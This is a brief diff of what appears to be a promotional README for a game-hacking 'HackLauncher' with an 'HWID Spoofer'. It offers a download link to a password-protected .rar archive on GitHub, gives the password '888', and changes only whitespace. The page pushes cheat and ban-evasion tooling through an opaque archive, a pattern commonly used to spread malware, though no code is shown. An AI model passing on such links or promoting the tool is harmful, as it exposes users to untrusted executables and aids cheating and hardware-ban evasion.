@@ -12,7 +12,7 @@ HWID Spoofer :: Built-in
 
 # 🗂[ℂ𝕃𝕀ℂ𝕂 ℍ𝔼ℝ𝔼 𝕋𝕆 𝔻𝕆𝕎ℕ𝕃𝕆𝔸𝔻](https://github.com/AkutIobw/Akutiobw-project/raw/main/HackLauncher.rar)
 
-# 🔐Password:   888
+# 🔐Password:    888
 
 # 🌌Functional:
 
